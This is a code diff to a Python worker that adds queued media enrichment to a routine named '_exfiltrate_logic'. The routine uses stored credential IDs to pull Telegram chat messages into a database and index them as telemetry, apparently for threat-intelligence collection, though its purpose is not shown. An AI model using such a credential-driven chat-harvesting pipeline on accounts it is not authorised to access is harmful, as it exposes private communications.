@@ -20,6 +20,30 @@ def _is_positive_scraped_message_id(value: Any) -> bool:
     """Scraped chat-message IDs occupy only the positive integer namespace."""
     return isinstance(value, int) and not isinstance(value, bool) and value > 0
 
+async def _enqueue_heavy_for_stored_rows(rows: list[dict[str, Any]]) -> None:
+    """Best-effort heavy enrichment enqueue for freshly stored media rows."""
+    try:
+        from app.workers.tasks.flows.heavy import enqueue_enrichment_for_message
+    except Exception as exc:  # noqa: BLE001 - enrichment hook is optional
+        logger.warning("[Exfil] heavy enrichment import skipped: %s", exc)
+        return
+    for row in rows:
+        try:
+            await asyncio.to_thread(
+                enqueue_enrichment_for_message,
+                row.get("media_type"),
+                row.get("id"),
+                row.get("credential_id"),
+                row.get("file_meta"),
+            )
+        except Exception as exc:  # noqa: BLE001 - capture flow must continue
+            logger.warning(
+                "[Exfil] heavy enrichment enqueue skipped for %s: %s",
+                row.get("id"),
+                exc,
+            )
+
+
 async def _send_alert(message: str) -> None:
     """Best-effort control-channel notification for high-priority telemetry."""
     try:
@@ -354,6 +378,13 @@ def exfiltrate_chat(cred_id: str):
 async def _exfiltrate_logic(cred_id: str):
     logger.info(f"🕵️ [Exfil] Starting process for CredID: {cred_id}")
 
+    try:
+        from app.workers.tasks.flows.heavy import reset_enqueue_run_budget
+
+        reset_enqueue_run_budget()
+    except Exception as exc:  # noqa: BLE001 - enrichment budget is best-effort
+        logger.debug("[Exfil] heavy enqueue budget reset skipped: %s", exc)
+
     broadcaster = get_broadcaster()
     await broadcaster.send_log(f"🕵️ Starting exfiltration for CredID: `{cred_id}`")
 
@@ -511,6 +542,7 @@ async def _exfiltrate_logic(cred_id: str):
     # Save Messages (using UPSERT to prevent duplicates)
     new_count = 0
     index_candidates: list[dict[str, Any]] = []
+    heavy_candidates: list[dict[str, Any]] = []
     for msg in messages:
         message_id = msg.get("telegram_msg_id") if isinstance(msg, dict) else None
         if not _is_positive_scraped_message_id(message_id):
@@ -537,6 +569,10 @@ async def _exfiltrate_logic(cred_id: str):
             if result.data:
                 new_count += 1
                 index_candidates.extend(result.data)
+                for stored_row in result.data:
+                    if isinstance(stored_row, dict):
+                        stored_row.setdefault("credential_id", cred_id)
+                        heavy_candidates.append(stored_row)
             else:
                 index_candidates.append(db_payload)
         except Exception as e:
@@ -544,6 +580,9 @@ async def _exfiltrate_logic(cred_id: str):
 
     if index_candidates:
         await _index_telemetry_indicators(index_candidates)
+
+    if heavy_candidates:
+        await _enqueue_heavy_for_stored_rows(heavy_candidates)
 
     if new_count > 0:
         await broadcaster.send_log(f"💾 Saved {new_count} new messages to DB.")
